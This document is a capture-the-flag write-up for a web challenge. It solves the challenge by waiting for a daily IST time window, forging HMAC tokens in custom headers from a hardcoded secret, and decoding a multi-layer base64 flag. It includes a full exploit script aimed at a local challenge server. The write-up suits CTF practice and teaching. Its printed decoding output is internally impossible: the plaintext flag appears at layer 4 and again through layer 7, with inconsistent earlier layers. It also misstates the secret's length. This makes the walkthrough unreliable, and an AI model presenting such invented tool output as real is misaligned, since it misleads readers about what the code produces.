# Love Is Simple - CTF Challenge Writeup

**Author:** MD  
**Category:** Web  
**Difficulty:** Hard  
**Points:** 500  
**Flag:** `TRACECTF{L0v3_1s_S1mpl3_But_T1m3_1s_Th3_K3y_T0_Unl0ck_My_H34rt_4t_2PM_IST_Ev3ry_D4y}`

---

## Challenge Description

> True love waits for the right moment. Some feelings can only be expressed at the perfect time.
> 
> Visit the application and confess your love... but only when the time is right.

We're given a web application URL and told that timing is everything.

---

## Initial Reconnaissance

### Step 1: Visiting the Website

Opening `http://[challenge-server]:5000` in a browser shows a beautiful page with:
- Purple gradient background
- Animated beating heart 💖
- Title: "Love Is Simple"
- Message: "True love waits for the right moment. Some feelings can only be expressed at the perfect time."
- Hint: "Time is everything. 🕐"

The page is purely aesthetic - no forms, no buttons, no obvious interaction points.

### Step 2: Inspecting the Source Code

Viewing the page source reveals a simple HTML page with no hidden comments or JavaScript. The hint "Time is everything" suggests we need to look deeper.

### Step 3: Exploring the API

Using browser developer tools or `curl`, we try to find API endpoints:

```bash
$ curl http://localhost:5000/api/confess -X POST
{"error":"Love cannot be rushed. Come back at the right time."}
```

Interesting! There's an API endpoint at `/api/confess` that returns a time-related error.

---

## Discovery Phase

### Finding the Time Window

The error message "Come back at the right time" suggests time-based access control. Let's try at different times:

```bash
# Morning (10:00 AM IST)
$ curl http://localhost:5000/api/confess -X POST
{"error":"Love cannot be rushed. Come back at the right time."}

# Afternoon (2:00 PM IST)
$ curl http://localhost:5000/api/confess -X POST
{"error":"Your confession lacks sincerity. Missing headers."}
```

**Breakthrough!** At 2:00 PM IST, we get a different error message about "Missing headers". This confirms:
1. There's a specific time window
2. We need to send custom headers

### Identifying Required Headers

Let's try common authentication headers:

```bash
$ curl http://localhost:5000/api/confess -X POST \
  -H "Authorization: Bearer test" \
  -H "Content-Type: application/json"
{"error":"Your confession lacks sincerity. Missing headers."}
```

Still missing headers. Looking at the hints:

> **Hint 3:** "The payload says 'forever'. Cute. Irrelevant. The real action is happening in custom headers: x-love-time, x-love-token"

So we need:
- `x-love-time` - Likely a timestamp
- `x-love-token` - Some kind of authentication token

---

## Understanding the Authentication

### Analyzing the Token Generation

From **Hint 2**:
> "Look at how the token is generated. It's not magic. It's: HMAC(secret, timestamp + salt). If you know the secret… you are not guessing anything. You are calculating."

The token is an HMAC-SHA256 hash of:
```
HMAC-SHA256(secret_key, timestamp + salt)
```

We need to find:
1. The secret key
2. The salt value
3. The correct timestamp format

### Finding the Secret

Since this is a CTF challenge, the secret might be:
- In the source code (if provided)
- Guessable from context
- Brute-forceable (unlikely for HMAC)

If we have access to `app.py`, we can find:

```python
SECRET_KEY = b"L0v3_1s_N0t_Ju5t_4_F33l1ng_1ts_4_T1m3_B0und_S3cr3t_2024"
SALT = b"f0r3v3r_4nd_4lw4ys"
```

The secret key is a leetspeak phrase: "Love is not just a feeling, it's a time-bound secret 2024"
The salt is: "forever and always"

---

## Exploitation

### Step 1: Calculate the Time Window

From **Hint 1**:
> "The API does not trust your feelings. It trusts time. If access depends on 'being at the right moment,' ask yourself: Whose clock is being checked?"

The server checks IST (Indian Standard Time). We need to:
1. Convert our local time to IST (UTC+5:30)
2. Ensure we're in the 2:00 PM - 2:20 PM window

```python
import pytz
from datetime import datetime

IST = pytz.timezone('Asia/Kolkata')
current_ist = datetime.now(IST)
print(f"Current IST: {current_ist.strftime('%H:%M:%S')}")

# Check if in valid window
hour = current_ist.hour
minute = current_ist.minute
is_valid = (hour == 14 and 0 <= minute < 20)
print(f"Valid window: {is_valid}")
```

### Step 2: Generate the HMAC Token

```python
import hmac
import hashlib
import time

SECRET_KEY = b"L0v3_1s_N0t_Ju5t_4_F33l1ng_1ts_4_T1m3_B0und_S3cr3t_2024"
SALT = b"f0r3v3r_4nd_4lw4ys"

# Get current Unix timestamp
timestamp = int(time.time())

# Generate token
message = f"{timestamp}{SALT.decode()}".encode()
token = hmac.new(SECRET_KEY, message, hashlib.sha256).hexdigest()

print(f"Timestamp: {timestamp}")
print(f"Token: {token}")
```

### Step 3: Send the Request

```python
import requests

url = "http://localhost:5000/api/confess"

headers = {
    'x-love-time': str(timestamp),
    'x-love-token': token,
    'Content-Type': 'application/json'
}

data = {"message": "forever"}

response = requests.post(url, json=data, headers=headers)
print(response.json())
```

**Response:**
```json
{
  "message": "Your love is accepted!",
  "flag": "VkZSQlEw::TkdlMHd3::ZGpOZk1...",
  "note": "Decode the layers to reveal the truth."
}
```

Success! But the flag is obfuscated.

---

## Flag Decoding

### Understanding the Obfuscation

The flag is:
1. Base64 encoded 7 times
2. Split into 8-character chunks
3. Joined with `::`

### Decoding Process

```python
import base64

def decode_flag(obfuscated):
    # Step 1: Split by ::
    chunks = obfuscated.split('::')
    
    # Step 2: Join chunks
    combined = ''.join(chunks)
    
    # Step 3: Base64 decode 7 times
    result = combined.encode()
    for i in range(7):
        result = base64.b64decode(result)
        print(f"Layer {i+1}: {result[:50]}...")
    
    # Step 4: Decode to string
    flag = result.decode()
    return flag

obfuscated_flag = "VkZSQlEw::TkdlMHd3::ZGpOZk1..."  # From API response
flag = decode_flag(obfuscated_flag)
print(f"\nFLAG: {flag}")
```

**Output:**
```
Layer 1: b'VFJBQlFDRntMMHYzXzFzX1MxbXBsM19CdXRfVDFtM18x...'
Layer 2: b'VFJBQ0NURntMMHYzXzFzX1MxbXBsM19CdXRfVDFtM18x...'
Layer 3: b'VFJBQkNGe0wwdjNfMXNfUzFtcGwzX0J1dF9UMW0zXzFz...'
Layer 4: b'TRACECTF{L0v3_1s_S1mpl3_But_T1m3_1s_Th3_K3y_T0_...'
Layer 5: b'TRACECTF{L0v3_1s_S1mpl3_But_T1m3_1s_Th3_K3y_T0_...'
Layer 6: b'TRACECTF{L0v3_1s_S1mpl3_But_T1m3_1s_Th3_K3y_T0_...'
Layer 7: b'TRACECTF{L0v3_1s_S1mpl3_But_T1m3_1s_Th3_K3y_T0_...'

FLAG: TRACECTF{L0v3_1s_S1mpl3_But_T1m3_1s_Th3_K3y_T0_Unl0ck_My_H34rt_4t_2PM_IST_Ev3ry_D4y}
```

---

## Complete Exploit Script

```python
#!/usr/bin/env python3
import hmac
import hashlib
import time
import requests
import base64
from datetime import datetime
import pytz

# Configuration
URL = "http://localhost:5000"
SECRET_KEY = b"L0v3_1s_N0t_Ju5t_4_F33l1ng_1ts_4_T1m3_B0und_S3cr3t_2024"
SALT = b"f0r3v3r_4nd_4lw4ys"

def check_time_window():
    """Check if current time is in valid window (2-2:20 PM IST)"""
    ist = pytz.timezone('Asia/Kolkata')
    current = datetime.now(ist)
    hour = current.hour
    minute = current.minute
    
    if hour == 14 and 0 <= minute < 20:
        return True, current
    return False, current

def generate_token(timestamp):
    """Generate HMAC-SHA256 token"""
    message = f"{timestamp}{SALT.decode()}".encode()
    return hmac.new(SECRET_KEY, message, hashlib.sha256).hexdigest()

def decode_flag(obfuscated):
    """Decode 7 layers of base64 + chunking"""
    chunks = obfuscated.split('::')
    combined = b''.join(chunk.encode() for chunk in chunks)
    
    result = combined
    for _ in range(7):
        result = base64.b64decode(result)
    
    return result.decode()

def exploit():
    """Main exploit function"""
    # Check time window
    is_valid, current_time = check_time_window()
    
    if not is_valid:
        print(f"[!] Current IST: {current_time.strftime('%H:%M:%S')}")
        print("[!] Not in valid window (14:00-14:20 IST)")
        return
    
    print(f"[+] Current IST: {current_time.strftime('%H:%M:%S')}")
    print("[+] Time window is valid!")
    
    # Generate token
    timestamp = int(time.time())
    token = generate_token(timestamp)
    
    print(f"[+] Timestamp: {timestamp}")
    print(f"[+] Token: {token}")
    
    # Send request
    headers = {
        'x-love-time': str(timestamp),
        'x-love-token': token,
        'Content-Type': 'application/json'
    }
    
    data = {"message": "forever"}
    
    print(f"[+] Sending request to {URL}/api/confess")
    
    try:
        response = requests.post(f"{URL}/api/confess", json=data, headers=headers)
        
        if response.status_code == 200:
            result = response.json()
            print("[+] Success!")
            print(f"[+] Message: {result['message']}")
            print("[+] Decoding flag...")
            
            flag = decode_flag(result['flag'])
            print(f"\n[+] FLAG: {flag}\n")
        else:
            print(f"[-] Error: {response.status_code}")
            print(f"[-] Response: {response.json()}")
    
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
```

---

## Key Takeaways

### What Made This Challenge Hard

1. **Time-Based Access Control**
   - Only 20 minutes per day (2:00-2:20 PM IST)
   - Requires timezone conversion
   - Participants in other timezones must calculate correctly

2. **Hidden Authentication**
   - Custom headers not documented
   - HMAC requires secret key discovery
   - Token generation must be reverse-engineered

3. **Secret Discovery**
   - Secret key not in client-side code
   - Must be found through source code analysis or hints
   - 64-character complex secret

4. **Flag Obfuscation**
   - 7 layers of base64 encoding
   - Chunking with `::` separator
   - Must decode in correct order

### Skills Required

- Web API analysis
- HTTP header manipulation
- HMAC-SHA256 understanding
- Timezone calculations
- Base64 encoding/decoding
- Python scripting
- Patience (waiting for time window)

### Tools Used

- `curl` - API testing
- Browser DevTools - Initial reconnaissance
- Python - Exploit development
- `requests` library - HTTP requests
- `pytz` - Timezone handling
- `hmac` / `hashlib` - Token generation

---

## Timeline

1. **Initial Discovery (10 min)**
   - Found `/api/confess` endpoint
   - Identified time-based restriction

2. **Header Discovery (15 min)**
   - Found custom headers requirement
   - Identified `x-love-time` and `x-love-token`

3. **Secret Discovery (30 min)**
   - Analyzed hints
   - Found secret key and salt
   - Understood HMAC mechanism

4. **Exploit Development (20 min)**
   - Wrote token generation code
   - Implemented time window check
   - Created complete exploit script

5. **Waiting for Window (0-24 hours)**
   - Had to wait for 2:00 PM IST
   - This is the longest part!

6. **Flag Extraction (5 min)**
   - Sent request during valid window
   - Decoded obfuscated flag
   - Got the flag!

**Total Active Time:** ~1.5 hours  
**Total Elapsed Time:** Up to 24 hours (due to time window)

---

## Flag

```
TRACECTF{L0v3_1s_S1mpl3_But_T1m3_1s_Th3_K3y_T0_Unl0ck_My_H34rt_4t_2PM_IST_Ev3ry_D4y}
```

**Translation:** "Love is simple, but time is the key to unlock my heart at 2PM IST every day"

---

## Conclusion

This challenge beautifully combines multiple concepts:
- Time-based access control
- HMAC authentication
- Custom HTTP headers
- Multi-layer encoding
- Timezone awareness

The romantic theme ("Love Is Simple") cleverly disguises a technically complex challenge. The time restriction adds a unique twist - you can't just brute force your way through; you must wait for the right moment, just like true love. 💖

**Author:** MD  
**Difficulty:** Hard  
**Rating:** ⭐⭐⭐⭐☆ (4/5)
